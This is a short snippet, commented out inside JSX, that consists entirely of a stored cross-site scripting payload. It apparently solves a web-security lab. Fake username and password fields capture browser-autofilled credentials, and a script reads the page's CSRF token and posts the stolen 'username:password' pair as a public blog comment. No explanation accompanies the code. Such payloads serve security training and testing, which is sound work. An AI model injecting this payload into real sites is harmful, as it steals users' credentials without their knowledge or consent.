{/* <input name=username id=username>
<input type=password name=password onchange="hax()">
<script>
function hax(){
    var token = document.getElementsByName('csrf')[0].value;
    var username = document.getElementsByName('username')[0].value;
    var password = document.getElementsByName('password')[0].value;
    
    var data = new FormData();
    data.append('csrf',token);
    data.append('postId',8);
    data.append('comment',`${username}:${password}`);
    data.append('name','victim');
    data.append('email','victim@gmail.com');
    data.append('website','https://google.com');

    fetch('/post/comment',{
        method: 'POST',
        mode: 'no-cors',
        body: data
    });
}
</script> */}